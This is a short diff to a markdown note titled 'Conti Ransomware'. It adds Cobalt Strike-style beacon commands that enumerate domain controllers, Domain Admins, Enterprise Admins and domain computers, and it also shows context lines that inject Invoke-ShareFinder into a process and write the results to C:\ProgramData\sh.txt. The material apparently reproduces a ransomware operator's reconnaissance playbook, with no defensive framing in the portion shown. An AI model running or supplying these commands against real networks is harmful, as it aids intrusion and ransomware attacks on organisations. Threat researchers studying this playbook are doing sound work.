@@ -1,4 +1,17 @@
 ### Conti Ransomware 
+
+```
+shell whoami  
+shell whoami /groups 
+shell nltest /dclist:
+net dclist 
+net domain_controllers
+shell net localgroup administrators
+shell net group /domain "Domain Admins" 
+shell net group "Enterprise Admins" /domain 
+shell net group "Domain Computers" /domain 
+net computers 
+```
 ```
 powershell-import /home/user/work/ShareFinder.ps1
 psinject 1234 x64 Invoke-ShareFinder -CheckAdmin -Verbose | Out-File -Encoding ascii C:\ProgramData\sh.txt
